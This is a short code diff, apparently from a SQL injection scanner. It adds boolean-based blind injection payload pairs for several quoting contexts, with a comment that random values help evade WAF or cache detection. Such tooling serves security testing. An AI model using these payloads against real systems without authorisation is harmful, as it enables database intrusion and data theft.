@@ -53,3 +53,14 @@ COMPILED_SIGNATURES = {
     dbms: [re.compile(p, re.I) for p in patterns]
     for dbms, patterns in DB_ERROR_SIGNATURES.items()
 }
+
+# Boolean-based blind: (TRUE condition, FALSE condition) templates.
+# {a} and {b} are replaced by two different random numbers, so a WAF or
+# cache cannot simply memorise one fixed payload. One pair per quoting context.
+BOOLEAN_PAIRS = [
+    (" AND {a}={a}", " AND {a}={b}"),                    # numeric: id=1 AND 1=1
+    ("' AND '{a}'='{a}", "' AND '{a}'='{b}"),            # single-quoted string
+    ('" AND "{a}"="{a}', '" AND "{a}"="{b}'),            # double-quoted string
+    ("' AND {a}={a}-- -", "' AND {a}={b}-- -"),          # single quote + comment
+    (") AND {a}={a}-- -", ") AND {a}={b}-- -"),          # inside parentheses
+]
